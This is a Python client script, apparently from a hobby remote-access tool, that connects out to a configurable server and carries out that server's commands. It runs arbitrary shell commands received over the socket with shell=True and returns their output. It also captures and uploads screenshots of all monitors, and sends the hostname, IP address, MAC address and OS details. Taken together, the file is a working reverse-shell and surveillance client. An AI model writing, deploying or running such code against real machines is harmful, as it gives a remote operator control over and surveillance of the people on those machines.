import json
import re
import socket
import subprocess
import sys
import threading
from datetime import datetime
import os
import base64
import textwrap
import platform
import uuid
from utils import is_socket_closed
import argparse

import numpy as np
from mss import mss # Multiple ScreenShot
# https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example


def send_data(sock: socket.socket, msg):
    if is_socket_closed(sock):
        print('Connection aborted (not in the whitelist)')
        return
    try:            
        # Send data to the server
        data = packet_crafting(msg)
        for packet in data:
            sock.sendall(packet) 

    except ConnectionResetError:
        print('The server closed the connection')


# return a list of one or more packets from 1024 to 8192 bytes long.  
# 8192 bytes long packet are for images
def packet_crafting(msg: str):
    HEADER = 8192
    data_size = len(msg) + 4 # Plus the header
    packets = []
    if (data_size > HEADER) : # image
        packets = img_to_packets(msg)
    
    else : # message
        packet_size = int((np.ceil(data_size/1024)*1024))
        msg_encoded = msg.encode('utf-8')
        header_encoded = packet_size.to_bytes(4, 'little')
        packet = header_encoded + msg_encoded
        # print(f'Header : {packet_size}')
        # print(f'Packet size : {len(packet)} - Crafted packet : {packet}')
        packets = [packet]

    return packets

# REFACTOR : fusion the header part
def img_to_packets(img_base64):
    HEADER = 8192
    packets = []
    string_delim = '<ST>' + img_base64 + '<ND>'

    chunks = textwrap.wrap(string_delim, 8188) # 8188 + 4 = 8192
    for chunk in chunks:
        header_encoded = HEADER.to_bytes(4, 'little')
        packet = header_encoded + chunk.encode('utf-8')
        packets.append(packet)
    return packets


def b64_to_txt(b64): # debug
    with open('img_b64.txt', 'wb') as fs:
        fs.write(b64)


# Features 
def send_screenshot(sock: socket.socket):
    with mss() as sct:
        sct.compression_level = 9 # max compression = +- 50 000 bytes file
        time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
        img_path = f'./screenshots/{time_stamp}.jpg' # filename = "./screenshots/2024-10-23_21H07.jng"
        for filename in sct.save(mon=-1, output=img_path): #-1 : fusion of all monitor
            print(filename)

        file_stats = os.stat(filename)
        print(f'File Size in Bytes is {file_stats.st_size}')

        # Img to base64 str 
        with open(img_path, 'rb') as img_file:
            data = base64.b64encode(img_file.read())
            string_chunking = data.decode('utf-8')
            b64_to_txt(data)

            send_data(sock, string_chunking)


# https://stackoverflow.com/a/58420504 
def get_sys_infos(sock: socket.socket) :
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        data = json.dumps(info)
        send_data(sock, data)
    except Exception as e:
        print(f'Error when retreiving system infos :\n{e}')


def get_data(sock: socket.socket):
    try: 
        res = sock.recv(1024).decode('utf-8')
        print(f'Server response : {res}')
        if res == 'screenshot':
            send_screenshot(sock)
        elif res == 'get_sys_infos' :
            get_sys_infos(sock)
        elif res != 'Alive ping back received':
            command = res.split(' ')
            res = exec_command(command)
            send_data(sock, res) # Returning command output
    except socket.timeout:
        print("Timeout, no response from server")
    except ConnectionAbortedError :
        pass # local closing


def exec_command(command):
    """ example : command = ['powershell', 'start', 'brave', 'www.google.com']"""
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    output = result.stdout or result.stderr
    if output:
        print(output)
    return output


def listen_for_commands(sock : socket.socket):
    try:            
        # socket_closed = False
        while True :
            print('Listening for inc data')
            get_data(sock)
            if is_socket_closed(sock):
                break

    except ConnectionResetError:
        print('The server closed the connection')
    finally:
        print('Connection closed')


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', default='localhost')
    parser.add_argument('-port', default='5000')

    return parser.parse_args()


if __name__ == '__main__':
    """ 
    You can use the args : -ip 192.168.0.1 -port 5000
    > python ./client.py -ip 192.168.0.1
    """
    args=parse_args()

    HOST, PORT = args.ip, int(args.port)
    MAX_TIMEOUT = 3
    print(f'Connecting to {HOST}@{PORT}')

    try: 
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: # Connect with TCP
            sock.settimeout(MAX_TIMEOUT)
            sock.connect((HOST, PORT))
            print(f'Connected @ : {sock.getpeername()}')
            send_data(sock, 'First connection ping')
            
            sock.settimeout(None)
            sock_thread = threading.Thread(target=listen_for_commands, args=(sock,))
            sock_thread.daemon = True  # Set the thread as a daemon so it doesn't block exit
            sock_thread.start()

            try:
                while sock_thread.is_alive():
                    sock_thread.join(timeout=1)  # Unblocking the main Thread
            except KeyboardInterrupt:
                print('Client terminated by user (Ctrl+C)')
                sock.close()
                sock_thread.join()
                # print(f"Threads : {threading.active_count()}")

    except ConnectionRefusedError:
        print('Connection refused by the host (server might be down or unreachable)')
    except socket.gaierror as e:
        print(f"Failed to resolve hostname {HOST}@{PORT}")
    except socket.timeout:
        print(f'Connection timed out {MAX_TIMEOUT}sec. The server might be unreachable.')
